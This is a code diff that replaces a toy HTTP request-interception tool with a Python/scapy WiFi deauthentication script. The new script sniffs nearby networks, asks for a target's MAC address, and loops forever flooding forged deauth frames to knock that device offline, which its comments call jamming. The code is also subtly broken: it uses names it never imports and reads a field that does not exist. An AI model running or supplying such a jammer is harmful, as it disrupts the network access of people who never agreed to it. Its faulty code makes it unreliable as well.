@@ -1,100 +1,32 @@
-import cmd
-import requests
-import subprocess
-import tempfile
 import os
+import time
+from scapy.all import RadioTap, Dot11, Dot11Deauth, sniff
 
-class InterceptingTool(cmd.Cmd):
-    os.system("figlet Fart Suite")
-    intro = "Welcome to Fart Suite (the lil brother of Burp Suite)! Type 'help' for a list of commands."
-    prompt = "Fart Suite~$ "
+# Function to scan and print WiFi information, including interface and MAC
+def scan_wifi_info(pkt):
+    if pkt.haslayer(Dot11):
+        bssid = pkt[Dot11].addr2
+        ssid = pkt[Dot11Elt].info.decode()
+        interface_type = pkt[RadioTap].present
+        interface_mac = pkt[RadioTap].addr2
+        print(f"SSID: {ssid} | BSSID: {bssid} | Interface Type: {interface_type} | Interface MAC: {interface_mac}")
 
-    intercepted_flows = []
+# Set your wireless interface
+interface = input("Set your Wireless Interface: ")
 
-    def default(self, line):
-        command, _, args = line.partition(' ')
-        if command == 'intercept':
-            self.do_intercept(args)
-        else:
-            print("Unknown command. Type 'help' for a list of commands.")
+# Start scanning for WiFi networks
+sniff(iface=interface, prn=scan_wifi_info, timeout=10)
 
-    def do_intercept(self, line):
-        """Intercept a URL and modify the request."""
-        url = line.strip()
-        if not url:
-            print("Invalid URL. Please provide a valid URL.")
-            return
-        try:
-            response = requests.get(url)
-            request = response.request
-            self.intercepted_flows.append(request)
-            print("Request intercepted and added to flows.")
-        except requests.exceptions.RequestException as e:
-            print(f"Error intercepting request: {e}")
+# Set the target's MAC address
+target_mac = input("Insert Target's MAC Address: ")
 
-    def do_flows(self, line):
-        """List all intercepted flows."""
-        if not self.intercepted_flows:
-            print("No intercepted flows.")
-        else:
-            for index, flow in enumerate(self.intercepted_flows, start=1):
-                print(f"{index}. {flow.url}")
+while True:
+    # Craft the deauthentication packet
+    deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff") / Dot11Deauth(reason=7)
 
-    def do_modify(self, line):
-        """Modify an intercepted flow."""
-        try:
-            flow_index = int(line.strip())
-            if flow_index < 1 or flow_index > len(self.intercepted_flows):
-                print("Invalid flow index.")
-            else:
-                flow = self.intercepted_flows[flow_index - 1]
-                modified_request = self.edit_request(flow)
-                if modified_request:
-                    # Send the modified request to the initial URL
-                    try:
-                        session = requests.Session()
-                        modified_request.method = flow.method  # Set the method directly
-                        response = session.send(modified_request, url=flow.url)
-                        print("Modified request sent successfully.")
-                    except requests.exceptions.RequestException as e:
-                        print(f"Error sending modified request: {e}")
-        except ValueError:
-            print("Invalid flow index.")
+    # Send the packet repeatedly to jam the target
+    for _ in range(100):
+        sendp(deauth_packet, iface=interface, verbose=False)
 
-    def edit_request(self, flow):
-        """Edit the intercepted request using an external text editor."""
-        with tempfile.NamedTemporaryFile(suffix=".http") as temp_file:
-            temp_file.write(f"{flow.method} {flow.url}\n".encode())
-            for header, value in flow.headers.items():
-                temp_file.write(f"{header}: {value}\n".encode())
-            temp_file.write(b"\n")
-            if flow.body:
-                temp_file.write(flow.body)
-            temp_file.flush()
-            try:
-                subprocess.call(["nano", temp_file.name])
-                temp_file.seek(0)
-                modified_request_text = temp_file.read().decode()
-                modified_request = requests.Request()
-                modified_request.prepare(
-                    url=flow.url,
-                    headers=flow.headers,
-                    data=modified_request_text.encode() if modified_request_text else flow.body,
-                )
-                return modified_request
-            except FileNotFoundError:
-                print("Error: nano text editor not found.")
-            except subprocess.CalledProcessError:
-                print("Error: Failed to open text editor.")
-        return None
-
-    def do_quit(self, line):
-        """Exit the intercepting tool."""
-        print("Exiting intercepting tool.")
-        return True
-
-    def emptyline(self):
-        pass
-
-if __name__ == "__main__":
-    InterceptingTool().cmdloop()
+    # Pause for a moment before sending more deauth packets
+    time.sleep(5)
